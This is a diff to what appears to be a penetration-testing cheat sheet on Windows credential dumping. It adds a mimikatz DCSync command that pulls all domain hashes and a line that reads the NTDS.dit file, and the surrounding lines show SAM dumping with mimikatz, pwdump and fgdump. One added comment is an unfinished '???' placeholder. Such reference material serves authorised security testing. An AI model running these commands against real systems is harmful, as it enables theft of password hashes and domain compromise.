@@ -655,8 +655,11 @@ cmd> mimikatz.exe
 mimikatz > privilege::debug
 mimikatz > token::elevate
 
-# Dump contents of SAM database
+# Dump contents of SAM database in current host
 mimikatz > lsadump::sam
+
+# Dump contents of ???
+mimikatz > lsadump::dcsync /domain:pentestlab.local /all
 ```
 
 Pwdump.exe
@@ -664,10 +667,17 @@ Pwdump.exe
 cmd> pwdump.exe localhost
 ```
 
-Fgdump.exe - improved pwdump, shutdown firewalls
+Fgdump.exe (improved pwdump, shutdown firewalls)
 ```
 cmd> fgdump.exe localhost
 ```
+
+NTDS.dit - Domain Controller
+```
+cmd> type C:\Windows\NTDS\NTDS.dit
+```
+
+
 
 
 ### Pass The Hash
